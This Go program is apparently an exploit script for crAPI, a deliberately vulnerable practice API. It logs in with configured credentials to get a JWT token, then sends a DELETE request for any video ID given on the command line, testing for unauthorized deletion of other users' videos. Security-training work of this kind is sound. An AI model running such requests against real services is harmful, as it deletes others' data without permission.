package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"

	configurator "github.com/tomek-skrond/crapiconfigurator"
)

func main() {
	pwd, _ := os.Getwd()
	config, err := configurator.GetConfig(pwd + "/config.json")
	if err != nil {
		log.Fatalln(err)
	}

	// get jwt token
	token := configurator.GetJWTToken(config.LoginURL, config.Email, config.Password)
	if token == "" {
		log.Fatalln("token empty")
	}

	idFlag := flag.Int("id", 0, "ID of video to delete")

	flag.Parse()

	id := *idFlag

	fmt.Println("Deleting video with ID:", id)
	UnauthorizedVideoDeletion(token, config.TargetURL, id)
}

func UnauthorizedVideoDeletion(token, targeturl string, id int) {
	client := configurator.CustomHttpClient()

	url := fmt.Sprintf("%s/%d", targeturl, id)
	fmt.Println(url)
	req, err := http.NewRequest("DELETE", url, nil)
	if err != nil {
		log.Fatalln(err)
	}

	req = configurator.ConfigureRequest(req, token)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	body, _ := configurator.ReadBody(resp)

	fmt.Println(string(body))

}
